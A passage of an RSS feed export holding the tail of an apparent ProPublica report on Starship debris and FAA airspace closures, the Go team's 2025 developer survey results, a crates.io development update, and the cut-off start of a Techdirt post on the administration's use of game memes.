with the FAA, which was also considering a request from SpaceX to increase the number of annual Starship launches from five to 25. “Last night’s Space X rocket explosion, which caused the diversion of several flights operating over the Gulf of Mexico, was pretty eye opening and scary,” wrote Steve Kriese in comments to the FAA, saying he was a captain for a major airline and often flew over the Gulf. “I do not support the increase of rocket launches by Space X, until a thorough review can be conducted on the disaster that occurred last night, and safety measures can be put in place that keeps the flying public safe.”Kriese could not be reached for comment.The Air Line Pilots Association urged the FAA to suspend Starship testing until the root cause of the failure could be investigated and corrected. A letter from the group, which represents more than 80,000 pilots flying for 43 airlines, said flight crews traveling in the Caribbean didn’t know where planes might be at risk from rocket debris until after the explosion. “By that time, it’s much too late for crews who are flying in the vicinity of the rocket operation, to be able to make a decision for the safe outcome of the flight,” wrote Jangelis, the pilot and aviation safety chair for the group. The explosion, he said, “raises additional concerns about whether the FAA is providing adequate separation of space operations from airline flights.”In response, the FAA said it would “review existing processes and determine whether additional measures can be taken to improve situational awareness for flight crews prior to launch.”According to FAA documents, the explosion propelled Starship fragments across an area nearly the size of New Jersey. Debris landed on beaches and roadways in Turks and Caicos. It also damaged a car. No one was injured.Three months later, the National Oceanic and Atmospheric Administration, which was evaluating potential impacts to marine life, sent the FAA a report with a map of where debris from an explosion could fall during future Starship failures. The estimate, which incorporated SpaceX’s own data from the Starship 7 incident, depicted an area more than three times the size of the airspace closed by the FAA. In a statement, an FAA spokesperson said NOAA’s map was “intended to cover multiple potential operations,” while the FAA’s safety analysis is for a “single actual launch.” A NOAA spokesperson said that the map reflects “the  area where mishaps could occur” and is not directly comparable with the FAA’s no-fly zones. Nevertheless Moriba Jah, a professor of aerospace engineering at the University of Texas, said the illustration suggested the no-fly zones the FAA activated may not fully capture how far and wide debris spreads after a rocket breakup. The current predictive science, he said, “carries significant uncertainty.” At an industry conference a few weeks after the January explosion, Shana Diez, a SpaceX executive, acknowledged the FAA’s challenges in overseeing commercial launches.“The biggest thing that we really would like to work with them on in the future is improving their real time awareness of where the launch vehicles are and where the launch vehicles’ debris could end up,” she said. “We’re Too Close to the Debris”On Feb. 26 of last year, with the investigation into Starship Flight 7 still open, the FAA cleared Flight 8 to proceed, saying it “determined SpaceX met all safety, environmental and other licensing requirements.” The action was allowed under a practice that began during the first Trump administration, known as “expedited return-to-flight,” that permitted commercial space companies to launch again even before the investigation into a prior problematic flight was complete, as long as safety systems were working properly.Coleman, who took a voluntary separation offer last year, said that before granting approval, the FAA confirmed that “safety critical systems,” such as the rocket’s ability to self-destruct if it went off course, worked as designed during Flight 7. By March 6, SpaceX was ready to launch again. This time the FAA gave pilots a heads-up an hour and 40 minutes before liftoff. “In the event of a debris-generating space launch vehicle mishap, there is the potential for debris falling within an area,” the advisory said, again listing coordinates for two zones in the Gulf and Caribbean. The FAA said a prelaunch safety analysis, which includes planning for potential debris, “incorporates lessons learned from previous flights.” The zone described in the agency’s advisory for the Caribbean was wider and longer than the previous one, while the area over the Gulf was significantly expanded.Flight 8 launched at 6:30 p.m. EST and its booster returned to the launchpad as planned. But a little more than eight minutes into the flight, some of Starship’s engines cut out. The craft went into a spin and about 90 seconds later SpaceX lost touch with it and it exploded.The FAA activated the no-fly zones less than two minutes later, using the same coordinates it had released prelaunch. Even with the advance warning, data shows at least five planes were in the debris zones at the time of the explosion, and they all cleared the airspace in a matter of minutes. A pilot on one of those planes, Frontier Flight 081, told passengers they could see the rocket explosion out the right-side windows. Dane Siler and Mariah Davenport, who were heading home to the Midwest after vacationing in the Dominican Republic, lifted the window shade and saw debris blazing across the sky, with one spot brighter than the rest.“It literally looked like the sun coming out,” Siler told ProPublica. “It was super bright.”They and other passengers shot videos, marveling at what looked like fireworks, the couple said. The Starship fragments appeared to be higher than the plane, many miles off. But before long, the pilot announced “I’m sorry to report that we have to turn around because we’re too close to the debris,” Siler said.Frontier did not respond to requests for comment.The FAA lifted the restriction on planes flying through the debris zone about 30 minutes after Starship exploded, much sooner than it had in January. The agency said that the Space Force had “notified the FAA that all debris was down approximately 30 minutes after the Starship Flight 8 anomaly.”But in response to ProPublica’s questions, the Space Force acknowledged that it did not track the debris in real time. Instead, it said “computational modeling,” along with other scientific measures, allowed the agency to “predict and mitigate risks effectively.” The FAA said “the aircraft were not at risk” during the aftermath of Flight 8.Experts told ProPublica that the science underlying such modeling is far from settled, and the government’s ability to anticipate how debris will behave after an explosion like Starship’s is limited. “You’re not going to find anybody who’s going to be able to answer that question with any precision,” said John Crassidis, an aerospace engineering professor at the University of Buffalo. “At best, you have an educated guess. At worst, it’s just a potshot.” Where pieces fall — and how long they take to land — depends on many factors, including atmospheric winds and the size, shape and type of material involved, experts said. During the breakup of Flight 7, the FAA kept airspace closed for roughly 86 minutes. However, Diez, the SpaceX executive, told attendees at the industry conference that, in fact, it had taken “hours” for all the debris to reach the ground. The FAA, SpaceX and Diez did not respond to follow-up questions about her remarks.It’s unclear how accurate the FAA’s debris projections were for the March explosion. The agency acknowledged that debris fell in the Bahamas, but it did not provide ProPublica the exact location, making it impossible to determine whether the wreckage landed where the FAA expected. While some of the country’s islands were within the boundaries of the designated debris zone, most were not. Calls and emails to Bahamas officials were not returned.The FAA said no injuries or serious property damage occurred.FAA Greenlights More LaunchesBy May, after months of Musk’s Department of Government Efficiency slashing spending and firing workers at federal agencies across Washington, the FAA granted SpaceX’s request to exponentially increase the number of Starship launches from Texas.Starship is key to “delivering greater access to space and enabling cost-effective delivery of cargo and people to the Moon and Mars,” the FAA found. The agency said it will make sure parties involved “are taking steps to ensure the safe, efficient, and equitable use” of national airspace.The U.S. is in a race to beat China to the lunar surface — a priority set by Trump’s first administration and continued under President Joe Biden. Supporters say the moon can be mined for resources like water and rare earth metals, and can offer a place to test new technologies. It could also serve as a stepping stone for more distant destinations, enabling Musk to achieve his longstanding goal of bringing humans to Mars. Trump pledged last January that the U.S. will “pursue our Manifest Destiny into the stars, launching American astronauts to plant the Stars and Stripes on the planet Mars.” But with experimental launches like Starship’s, Jangelis said, the FAA should be “as conservative as possible” when managing the airspace below them.“We expect the FAA to make sure our aircraft and our passengers stay safe,” he said. “There has to be a balance between the for-profit space business and the for-profit airlines and commerce.”A More Conservative ApproachIn mid-May, United Kingdom officials sent a letter to their U.S. counterparts, asking that SpaceX and the FAA change Starship’s flight path or take other precautions because they were worried about the safety of their Caribbean territories.The following day, the FAA announced in a news release that it had approved the next Starship launch, pending either the agency’s closure of the investigation into Flight 8 or granting of a “return to flight” determination.A week later, with the investigation into Flight 8 still open, the agency said SpaceX had “satisfactorily addressed” the causes of the mishap. The FAA did not detail what those causes were at the time but said it would verify that the company implemented all necessary “corrective actions.” This time the FAA was more aggressive on air safety. The agency preventively closed an extensive swath of airspace extending 1,600 nautical miles from the launch site, across the Gulf of Mexico and through part of the Caribbean. The FAA said that 175 flights or more could be affected, and it advised Turks and Caicos’ Providenciales International Airport to close during the launch.The agency said the move was driven in part by an “updated flight safety analysis” and SpaceX’s decision to reuse a previously launched Super Heavy booster — something the company had never tried before. The agency also said it was “in close contact and collaboration with the United Kingdom, Turks & Caicos Islands, Bahamas, Mexico, and Cuba.”Coleman told ProPublica that the concerns of the Caribbean countries, along with Starship’s prior failures, helped convince the FAA to close more airspace ahead of Flight 9.On May 27, the craft lifted off at 7:36 p.m. EDT, an hour later than in March and two hours later than in January. The FAA said it required the launch window to be scheduled during “non-peak transit periods.”This mission, too, ended in failure.Starship’s Super Heavy booster blew up over the Gulf of Mexico, where it was supposed to have made what’s called a “hard splashdown.” In response, the FAA again activated an emergency no-fly zone. Most aircraft had already been rerouted around the closed airspace, but the agency said it diverted one plane and put another in a holding pattern for 24 minutes. The FAA did not provide additional details on the flights.Starship’s upper stage reached the highest planned point in its flight path, but it went into a spin on the way down, blowing up over the Indian Ocean.SpaceX launched Starship again in August and October. Unlike the prior flights, both went off without incident, and the company said it was turning its focus to the next generation of Starship to provide “service to Earth orbit, the Moon, Mars, and beyond.”But about a week later, Transportation Secretary Sean Duffy said he would open up SpaceX’s multibillion-dollar contract for a crewed lunar lander to rival companies. SpaceX is “an amazing company,” he said on CNBC. “The problem is, they’re behind.”Musk pushed back, saying on X that “SpaceX is moving like lightning compared to the rest of the space industry.” He insulted Duffy, calling him “Sean Dummy” and saying “The personresponsible for America’s space program can’t have a 2 digit IQ.”The Department of Transportation did not respond to a request for comment or make Duffy available.In a web post on Oct. 30, SpaceX said it was proposing “a simplified mission architecture and concept of operations” that would “result in a faster return to the Moon while simultaneously improving crew safety.”SpaceX is now seeking FAA approval to add new trajectories as Starship strives to reach orbit. Under the plan, the rocket would fly over land in Florida and Mexico, as well as the airspace of Cuba, Jamaica and the Cayman Islands, likely disrupting hundreds of flights. In its letter, the pilots’ union told the FAA that testing Starship “over a densely populated area should not be allowed (given the dubious failure record)” until the craft becomes more reliable. The planned air closures could prove “crippling” for the Central Florida aviation network, it added.Still, SpaceX is undeterred. Diez, the company executive, said on X in October, “We are putting in the work to make 2026 an epic year for Starship.”]]></content:encoded></item><item><title>Results from the 2025 Go Developer Survey</title><link>https://go.dev/blog/survey2025</link><author>Todd Kulesza, on behalf of the Go team</author><category>dev</category><pubDate>Wed, 21 Jan 2026 00:00:00 +0000</pubDate><source url="http://blog.golang.org/feed.atom">Golang Blog</source><content:encoded><![CDATA[Hello! In this article we’ll discuss the results of the 2025 Go Developer
Survey, conducted during September 2025.Thank you to the 5,379 Go developers who responded to our survey invitation
this year. Your feedback helps both the Go team at Google and the wider Go
community understand the current state of the Go ecosystem and prioritize
projects for the year ahead.Our three biggest findings are:Broadly speaking, Go developers asked for help with identifying and applying
best practices, making the most of the standard library, and expanding the
language and built-in tooling with more modern capabilities.Most Go developers are now using AI-powered development tools when seeking
information (e.g., learning how to use a module) or toiling (e.g., writing
repetitive blocks of similar code), but their satisfaction with these tools
is middling due, in part, to quality concerns.A surprisingly high proportion of respondents said they frequently need to
review documentation for core  subcommands, including , , and , suggesting meaningful room for improvement with the 
command’s help system.Read on for the details about these findings, and much more.Most survey respondents self-identified as professional developers (87%) who
use Go for their primary job (82%). A large majority also uses Go for personal
or open-source projects (72%). Most respondents were between 25 – 45
years old (68%) with at least six years of professional development experience
(75%). Going deeper, 81% of respondents told us they had more professional
development experience than Go-specific experience, strong evidence that Go is
usually not the first language developers work with. In fact, one of the
themes that repeatedly surfaced during this year’s survey analysis seems to
stem from this fact: when the way to do a task in Go is substantially
different from a more familiar language, it creates friction for developers to
first learn the new (to them) idiomatic Go pattern, and then to consistently
recall these differences as they continue to work with multiple languages.
We’ll return to this theme later.The single most common industry respondents work in was “Technology” (46%),
but a majority of respondents work outside of the tech industry (54%). We saw
representation of all sizes of organizations, with a bare majority working
somewhere with 2 – 500 employees (51%), 9% working alone, and 30%
working at enterprises of over 1,000 employees. As in prior years, a majority
of responses come from North America and Europe.This year we observed a decrease in the proportion of respondents who said
they were fairly new to Go, having worked with it for less than one year
(13%, vs. 21% in 2024). We suspect this is related to industry-wide
declines in entry-level software engineering roles; we commonly hear from
people that they learned Go for a specific job, so a downturn in hiring would
be expected to reduce the number of developers learning Go in that year. This
hypothesis is further supported by our finding that over 80% of respondents
learned Go  beginning their professional career.Other than the above, we found no significant changes in other demographics
since our 2024 survey.How do people feel about Go?The vast majority of respondents (91%) said they felt satisfied while working
with Go. Almost ⅔ were “very satisfied”, the highest rating. Both of these
metrics are incredibly positive, and have been stable since we began asking
this question in 2019. The stability over time is really what we monitor from
this metric — we view it as a lagging indicator, meaning by the time
this satisfaction metric shows a meaningful change, we would expect to already
have seen earlier signals from issue reports, mailing lists, or other
community feedback.Why were respondents so positive about Go? Looking at open-text responses to
several different survey questions suggests that it’s the gestalt, rather than
any one thing. These folks are telling us that they find tremendous value in
Go as a holistic platform. That doesn’t mean it supports all programming
domains equally well (it surely does not), but that developers’ value the
domains it  nicely support via stdlib and built-in tooling.Below are some representative quotations from respondents. To provide context
for each quote, we also identify the satisfaction level, years of experience
with Go, and industry of the respondent.“Go is by far my favorite language; other languages feel far too complex and
unhelpful. The fact that Go is comparatively small, simple, with fewer bells
and whistles plays a massive role in making it such a good long-lasting
foundation for building programs with it. I love that it scales well to
being used by a single programmer and in large teams.” “The entire reason I use Go is the great tooling and standard library.  I’m
very thankful to the team for focusing on great HTTP, crypto, math, sync,
and other tools that make developing service-oriented applications easy and
reliable.” “[The] Go ecosystem is the reason why I really like the programming
language. There are a lot of npm issues lately but not with Go.” This year we also asked about the other languages that people use. Survey
respondents said that besides Go, they enjoy working with Python, Rust, and
TypeScript, among a long tail of other languages. Some shared characteristics
of these languages align with common points of friction reported by Go
developers, including  areas like error handling, enums, and object-oriented
design patterns. For example, when we sum the proportion of respondents who
said their next-favorite language included one of the following factors, we
found that majorities of respondents enjoy using languages with inheritance,
type-safe enums, and exceptions, with only a bare majority of these languages
including a static type system by default.Proportion of respondentsWe think this is important because it reveals the larger environment in which
developers operate — it suggests that people need to use different
design patterns for fairly mundane tasks, depending on the language of the
codebase they’re currently working on. This leads to additional cognitive load
and confusion, not only among developers new to Go (who must learn idiomatic
Go design patterns), but also among the many developers who work in multiple
codebases or projects. One way to alleviate this additional load is
context-specific guidance, such as a tutorial on “Error handling in Go for
Java developers”. There may even be opportunities to build some of this
guidance into code analyzers, making it easier to surface directly in an IDE.This year we asked the Go community to share their sentiment towards the Go
project itself. These results were quite different from the 91% satisfaction
rate we discussed above, and point to areas the Go Team plans to invest our
energy during 2026. In particular, we want to encourage more contributors to
get involved, and ensure the Go Team accurately understands the challenges Go
developers currently face. We hope this focus, in turn, will help to increase
developer trust in both the Go project and the Go Team leadership. As one
respondent explained the problem:“Now that the founding first generation of Go Team members [are] not
involved much anymore in the decision making, I am a bit worried about the
future of Go in terms of quality of maintenance, and its balanced decisions
so far wrt to changes in the language and std lib. More presence in form of
talks [by] the new core team members about the current state and future
plans might be helpful to strengthen trust.” What are people building with Go?We revised this list of “what types of things do you build with Go?” from 2024
with the intent of more usefully teasing apart what people are building with
Go, and avoid confusion around evolving terms like “agents”. Respondent’s top
use cases remain CLIs and API services, with no meaningful change in either
since 2024. In fact, a majority of respondents (55%) said they build 
CLIs and API services with Go. Over ⅓ of respondents specifically build cloud
infrastructure tooling (a new category), and 11% work with ML models, tools,
or agents (an expanded category). Unfortunately embedded use cases were left
off of the revised list, but we’ll fix this for next year’s survey.Most respondents said they are not currently building AI-powered features into
the Go software they work on (78%), with ⅔ reporting that their software does
not use AI functionality at all (66%). This appears to be a decrease in
production-related AI usage year-over-year; in 2024, 59% of respondents were
not involved in AI feature work, while 39% indicated some level of
involvement. That marks a shift of 14 points away from building AI-powered
systems among survey respondents, and may reflect some natural pullback from
the early hype around AI-powered applications: it’s plausible that lots of
folks tried to see what they could do with this technology during its initial
rollout, with some proportion deciding against further exploration (at least
at this time).Among respondents who are building AI- or LLM-powered functionality, the most
common use case was to create summaries of existing content (45%). Overall,
however, there was little difference between most uses, with between 28%
– 33% of respondents adding AI functionality to support classification,
generation, solution identification, chatbots, and software development.What are the biggest challenges facing Go developers?One of the most helpful types of feedback we receive from developers are
details about the challenges people run into while working with Go. The Go
Team considers this information holistically and over long time horizons,
because there is often tension between improving Go’s rougher edges and
keeping the language and tooling consistent for developers. Beyond technical
factors, every change also incurs some cost in terms of developer attention
and cognitive disruption. Minimizing disruption may sound a bit dull or
boring, but we view this as an important strength of Go. As Russ Cox wrote in
2023, “Boring is good… Boring means being able to focus on your work, not
on what’s different about Go.”.In that spirit, this year’s top challenges are not radically different from
last year’s. The top three frustrations respondents reported were “Ensuring
our Go code follows best practices / Go idioms” (33% of respondents), “A
feature I value from another language isn’t part of Go” (28%), and “Finding
trustworthy Go modules and packages” (26%). We examined open-text responses to
better understand what people meant. Let’s take a minute to dig into each.Respondents who were most frustrated by writing idiomatic Go were often
looking for more official guidance, as well as tooling support to help enforce
this guidance in their codebase. As in prior surveys, questions about how to
structure Go projects were also a common theme. For example:“The simplicity of go helps to read and understand code from other
developers, but there are still some aspects that can differ quite a lot
between programmers. Especially if developers come from other languages,
e.g. Java.” “More opinionated way to write go code. Like how to structure a Go project
for services/cli tool.” “It’s hard to figure out what are good idioms. Especially since the core
team doesn’t keep Effective Go up-to-date.” The second major category of frustrations were language features that
developers enjoyed working with in other ecosystems. These open-text comments
largely focused on error handling and reporting patterns, enums and sum types,
nil pointer safety, and general expressivity / verbosity:“Still not sure what is the best way to do error handling.” “Rust’s enums are great, and lead to writing great type safe code.” “There is nothing (in the compiler) that stops me from using a maybe nil
pointer, or using a value without checking the err first. That should be
[baked into] the type system.” “I like [Go] but I didn’t expect it to have nil pointer exceptions :)” “I often find it hard to build abstractions and to provide clear intention
to the future readers of my code.” The third major frustration was finding trustworthy Go modules. Respondents
often described two aspects to this problem. One is that they considered many
3rd-party modules to be of marginal quality, making it hard for really good
modules to stand out. The second is identifying which modules are commonly
used and under which types of conditions (including recent trends over time).
These are both problems that could be addressed by showing what we’ll vaguely
call “quality signals” on pkg.go.dev. Respondents provided helpful
explanations of the signals they use to identify trustworthy modules,
including project activity, code quality, recent adoption trends, or the
specific organizations that support or rely upon the module.“Being able to filter by criteria like stable version, number of users and
last update age at pkg.go.dev could make things a bit easier.” “Many pacakges are just clones/forks or one-off pojects with no
history/maintenance. [sic]” “Maybe flagging trustworthy packages based on experience, maturity and
community feedback?” We agree that these are all areas where the developer experience with Go could
be improved. The challenge, as discussed earlier, is doing so in such a way
that doesn’t lead to breaking changes, increased confusion among Go
developers, or otherwise gets in the way of people trying to get their work
done with Go. Feedback from this survey is a major source of information we
use when discussing proposals, but if you’d like to get involved more directly
or follow along with other contributors, visit the Go proposals on
GitHub;
please be sure to follow this process if
you’d like to add a new proposal.In addition to these (potentially) ecosystem-wide challenges, this year we
also asked specifically about working with the  command. We’ve informally
heard from developers that this tool’s help system can be confusing to
navigate, but we haven’t had a great sense of how frequently people find
themselves reviewing this documentation.Respondents told us that except for , between 15% – 25% of them
felt they “often needed to review documentation” with working with these
tools. This was surprising, especially for commonly-used subcommands like
 and . Common reasons included remembering specific flags,
understanding what different options do, and navigating the help system
itself. Participants also confirmed that infrequent use was one reason for
frustration, but navigating and parsing command help appears to be the
underlying cause. In other words, we all expect to need to review
documentation sometimes, but we don’t expect to need help navigating the
documentation system itself. As on respondent described their journey:“Accessing the help is painful. go test –help # didn’t work, but tell[s] me
to type  instead… go help test # oh, actually, the info I’m
looking for is in  go help testflag # visually parsing through
text that looks all the same without much formatting… I just lack time to
dig into this rabbit hole.” What does their development environment look like?Operating systems and architecturesGenerally, respondents told us their development platforms are UNIX-like. Most
respondents develop on macOS (60%) or Linux (58%) and deploy to Linux-based
systems, including containers (96%). The largest year-over-year change was
among “embedded devices / IoT” deployments, which increased from 2% -> 8% of
respondents; this was the only meaningful change in deployment platforms since
2024.The vast majority of respondents develop on x86-64 or ARM64 architectures,
with a sizable group (25%) still potentially working on 32-bit x86 systems.
However, we believe the wording of this question was confusing to respondents;
next year we’ll clarify the 32-bit vs. 64-bit distinction for each
architecture.Several new code editors have become available in the past two years, and we
expanded our survey question to include the most popular ones. While we saw
some evidence of early adoption, most respondents continued to favor VS
Code (37%) or
GoLand (28%). Of the newer editors, Zed and
Cursor were the highest ranked, each becoming the preferred editor of 4% of
respondents. To put those numbers in context, we looked back at when VS Code
and GoLand were first introduced. VS Code (released in 2015) was favored by
16% of respondents one year after its release. IntelliJ has had a
community-led Go plugin longer than we’ve been surveying Go developers (💙),
but if we look at when JetBrains began officially supporting Go in IntelliJ
(2016), within one year IntelliJ was preferred by 20% of respondents.Note: This analysis of code editors does not include respondents who were
referred to the survey directly from VS Code or GoLand.The most common deployment environments for Go continue to be Amazon Web
Services (AWS) at 46% of respondents, company-owned servers (44%), and Google
Cloud Platform (GCP) at 26%. These numbers show minor shifts since 2024, but
nothing statistically significant. We found that the “Other” category
increased to 11% this year, and this was primarily driven by Hetzner (20% of
Other responses); we plan to include Hetzner as a response choice in next
year’s survey.We also asked respondents about their development experience of working with
different cloud providers. The most common responses, however, showed that
respondents weren’t really sure (46%) or don’t directly interact with public
cloud providers (21%). The biggest driver behind these responses was a theme
we’ve heard often before: with containers, it’s possible to abstract many
details of the cloud environment away from the developer, so that they don’t
meaningfully interact with most provider-specific technologies. This result
suggests that even developers whose work is  to clouds may have
limited experience with the larger suite of tools and technology associated
with each cloud provider. For example:“Kinda abstract to the platform, Go is very easy to put in a container and
so pretty easy to deploy anywhere: one of its big strength[s].” “The cloud provider really doesn’t make much difference to me. I write code
and deploy it to containers, so whether that’s AWS or GCP I don’t really
care.” We suspect this level of abstraction is dependant on the use case and
requirements of the service that’s being deployed — it may not always
make sense or be possible to keep it highly abstracted. In the future, we plan
to further investigate how Go developers tend to interact with the platforms
where their software is ultimately deployed.Finally, we can’t discuss development environments in 2025 without also
mentioning AI-powered software development tools. Our survey suggests
bifurcated adoption — while a majority of respondents (53%) said they
use such tools daily, there is also a large group (29%) who do not use these
at all, or only used them a few times during the past month. We expected this
to negatively correlate with age or development experience, but were unable to
find strong evidence supporting this theory except for  new developers:
respondents with less than one year of professional development experience
(not specific to Go) did report more AI use than every other cohort, but this
group only represented 2% of survey respondents.At this time, agentic use of AI-powered tools appears nascent among Go
developers, with only 17% of respondents saying this is their primary way of
using such tools, though a larger group (40%) are occasionally trying agentic
modes of operation.The most commonly used AI assistants remain ChatGPT, GitHub Copilot, and
Claude. Most of these agents show lower usage numbers compared with our 2024
survey (Claude and Cursor are
notable exceptions), but due to a methodology change, this is not an
apples-to-apples comparison. It is, however, plausible that developers are
“shopping around” less than they were when these tools were first released,
resulting in more people using a single assistant for most of their work.We also asked about overall satisfaction with AI-powered development tools. A
majority (55%) reported being satisfied, but this was heavily weighted towards
the “Somewhat satisfied” category (42%) vs. the “Very satisfied” group (13%).
Recall that Go itself consistently shows a 90%+ satisfaction rate each year;
this year, 62% of respondents said they are “Very satisfied” with Go. We add
this context to show that while AI-powered tooling is starting to see adoption
and finding some successful use cases, developer sentiment  towards them
remains much softer than towards more established tooling (among Go
developers, at least).What is driving this lower rate of satisfaction? In a word: quality. We asked
respondents to tell us something good they’ve accomplished with these tools,
as well as something that didn’t work out well. A majority said that creating
non-functional code was their primary problem with AI developer tools (53%),
with 30% lamenting that even working code was of poor quality. The most
frequently cited benefits, conversely, were generating unit tests, writing
boilerplate code, enhanced autocompletion, refactoring, and documentation
generation. These appear to be cases where code quality is perceived as less
critical, tipping the balance in favor of letting AI take the first pass at a
task. That said, respondents also told us the AI-generated code in these
successful cases still required careful review (and often, corrections), as it
can be buggy, insecure, or lack context.“I’m never satisfied with code quality or consistency, it never follows the
practices I want to.” “All AI tools tend to hallucinate quickly when working with medium-to-large
codebases (10k+ lines of code). They can explain code effectively but
struggle to generate new, complex features” “Despite numerous efforts to make it write code in an established codebase,
it would take too much effort to steer it to follow the practices in the
project, and it would add subtle behaviour paths - i.e. if it would miss
some method it would try to find its way around it or rely on some side
effect. Sometimes those things are hard to recognize during code review. I
also found it mentally taxing to review ai generated code and that overhead
kills the productivity potential in writing code.” When we asked developers what they used these tools for, a pattern emerged
that is consistent with these quality concerns. The tasks with most adoption
(green in the chart below) and least resistance (red) deal with bridging
knowledge gaps, improving local code, and avoiding toil. The frustrations that
developers talk about with code-generating tools were much less evident when
they’re seeking information, like how to use a specific API or configure test
coverage, and perhaps as a result, we see higher usage of AI in these areas.
Another spot that stood out was  code review and related suggestions
— people were less interested in using AI to review other people’s code
than in reviewing their own. Surprisingly, “testing code” showed lower AI
adoption than other toilsome tasks, though we don’t yet have strong
understanding of why.Of all the tasks we asked about, “Writing code” was the most bifurcated, with
66% of respondents already or hoping to soon use AI for this, while ¼ of
respondents didn’t want AI involved at all. Open-ended responses suggest
developers primarily use this for toilsome, repetitive code, and continue to
have concerns about the quality of AI-generated code.Once again, a tremendous thank-you to everyone who responded to this year’s Go
Developer Survey!We plan to share the raw survey dataset in Q1 2026, so the larger community
can also explore the data underlying these findings. This will only include
responses from people who opted in to share this data (82% of all
respondents), so there may be some differences from the numbers we reference
in this post.This survey was conducted between Sept 9 - Sept 30, 2025. Participants were
publicly invited to respond via the Go Blog, invitations on social media
channels (including Bluesky, Mastodon, Reddit, and X), as well as randomized
in-product invitations to people using VS Code and GoLand to write Go
software. We received a total of 7,070 responses. After data cleaning to
remove bots and other very low quality responses, 5,379 were used for the
remainder of our analysis. The median survey response time was between 12
– 13 minutes.Throughout this report we use charts of survey responses to provide supporting
evidence for our findings. All of these charts use a similar format. The title
is the exact question that survey respondents saw. Unless otherwise noted,
questions were multiple choice and participants could only select a single
response choice; each chart’s subtitle will tell the reader if the question
allowed multiple response choices or was an open-ended text box instead of a
multiple choice question. For charts of open-ended text responses, a Go team
member read and manually categorized all of the responses. Many open-ended
questions elicited a wide variety of responses; to keep the chart sizes
reasonable, we condensed them to a maximum of the top 10-12 themes, with
additional themes all grouped under “Other”. The percentage labels shown in
charts are rounded to the nearest integer (e.g., 1.4% and 0.8% will both be
displayed as 1%), but the length of each bar and row ordering are based on the
unrounded values.To help readers understand the weight of evidence underlying each finding, we
included error bars showing the 95% confidence
interval for responses;
narrower bars indicate increased confidence. Sometimes two or more responses
have overlapping error bars, which means the relative order of those responses
is not statistically meaningful (i.e., the responses are effectively tied).
The lower right of each chart shows the number of people whose responses are
included in the chart, in the form “n = [number of respondents]”.]]></content:encoded></item><item><title>crates.io: development update</title><link>https://blog.rust-lang.org/2026/01/21/crates-io-development-update/</link><author>Tobias Bieniek</author><category>dev</category><pubDate>Wed, 21 Jan 2026 00:00:00 +0000</pubDate><source url="https://blog.rust-lang.org/">Rust Blog</source><content:encoded><![CDATA[Time flies! Six months have passed since our last crates.io development update, so it's time for another one. Here's a summary of the most notable changes and improvements made to crates.io over the past six months.Crate pages now have a new "Security" tab that displays security advisories from the RustSec database. This allows you to quickly see if a crate has known vulnerabilities before adding it as a dependency.The tab shows known vulnerabilities for the crate along with the affected version ranges.This feature is still a work in progress, and we plan to add more functionality in the future. We would like to thank the OpenSSF (Open Source Security Foundation) for funding this work and Dirkjan Ochtman for implementing it.
Trusted Publishing EnhancementsIn our July 2025 update, we announced Trusted Publishing support for GitHub Actions. Since then, we have made several enhancements to this feature.Trusted Publishing now supports GitLab CI/CD in addition to GitHub Actions. This allows GitLab users to publish crates without managing API tokens, using the same OIDC-based authentication flow.Note that this currently only works with GitLab.com. Self-hosted GitLab instances are not supported yet. The crates.io implementation has been refactored to support multiple CI providers, so adding support for other platforms like Codeberg/Forgejo in the future should be straightforward. Contributions are welcome!
Trusted Publishing Only ModeCrate owners can now enforce Trusted Publishing for their crates. When enabled in the crate settings, traditional API token-based publishing is disabled, and only Trusted Publishing can be used to publish new versions. This reduces the risk of unauthorized publishes from leaked API tokens.The  and  GitHub Actions triggers are now blocked from Trusted Publishing. These triggers have been responsible for multiple security incidents in the GitHub Actions ecosystem and are not worth the risk.Crate pages now display source lines of code (SLOC) metrics, giving you insight into the size of a crate before adding it as a dependency. This metric is calculated in a background job after publishing using the tokei crate. It is also shown on OpenGraph images:
Publication Time in IndexA new  field has been added to crate index entries, recording when each version was published. This enables several use cases:Cargo can implement cooldown periods for new versions in the futureCargo can replay dependency resolution as if it were a past date, though yanked versions remain yankedServices like Renovate can determine release dates without additional API requests
Svelte Frontend MigrationAt the end of 2025, the crates.io team evaluated several options for modernizing our frontend and decided to experiment with porting the website to Svelte. The goal is to create a one-to-one port of the existing functionality before adding new features.This migration is still considered experimental and is a work in progress. Using a more mainstream framework should make it easier for new contributors to work on the frontend. The new Svelte frontend uses TypeScript and generates type-safe API client code from our OpenAPI description, so types flow from the Rust backend to the TypeScript frontend automatically.Thanks to eth3lbert for the helpful reviews and guidance on Svelte best practices. We'll share more details in a future update.These were some of the more visible changes to crates.io over the past six months, but a lot has happened "under the hood" as well.Cargo user agent filtering: We noticed that download graphs were showing a constant background level of downloads even for unpopular crates due to bots, scrapers, and mirrors. Download counts are now filtered to only include requests from Cargo, providing more accurate statistics.: Emails from crates.io now support HTML formatting.: OAuth access tokens from GitHub are now encrypted at rest in the database. While we have no evidence of any abuse, we decided to improve our security posture. The tokens were never included in the daily database dump, and the old unencrypted column has been removed.: Crate pages now display a "Browse source" link in the sidebar that points to the corresponding docs.rs page. Thanks to Carol Nichols for implementing this feature.: The sparse index at index.crates.io is now served primarily via Fastly to conserve our AWS credits for other use cases. In the past month, static.crates.io served approximately 1.6 PB across 11 billion requests, while index.crates.io served approximately 740 TB across 19 billion requests. A big thank you to Fastly for providing free CDN services through their Fast Forward program!OpenGraph image improvements: We fixed emoji and CJK character rendering in OpenGraph images, which was caused by missing fonts on our server.Background worker performance: Database indexes were optimized to improve background job processing performance.CloudFront invalidation improvements: Invalidation requests are now batched to avoid hitting AWS rate limits when publishing large workspaces.We hope you enjoyed this update on the development of crates.io. If you have any feedback or questions, please let us know on Zulip or GitHub. We are always happy to hear from you and are looking forward to your feedback!]]></content:encoded></item><item><title>Trump Continues To Use Pop Culture Memes Without Permission, This Time With A 3rd Term Easter Egg</title><link>https://www.techdirt.com/2026/01/20/trump-continues-to-use-pop-culture-memes-without-permission-this-time-with-a-3rd-term-easter-egg/</link><author>Timothy Geigner</author><category>tech</category><pubDate>Tue, 20 Jan 2026 23:45:23 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[The Trump administration’s penchant for announcing or celebrating its various dumbass policies via pop culture video game memes marches on, it seems. We talked about this sort of thing previously when the administration built an ICE recruitment video to mimic the intro to the  cartoon show (gotta catch ’em all… get it?), as well as ICE recruiting memes utilizing imagery from the  series of games (aliens… get it?). Despite the blatant and obvious use of imagery and IP from both games, both Nintendo and Microsoft were remarkably silent about it all. What’s wrong, guys? Fascist got your tongue?But because they couldn’t be bothered to lift a finger over what is a pretty clear infringement of their trademarks and/or copyright, 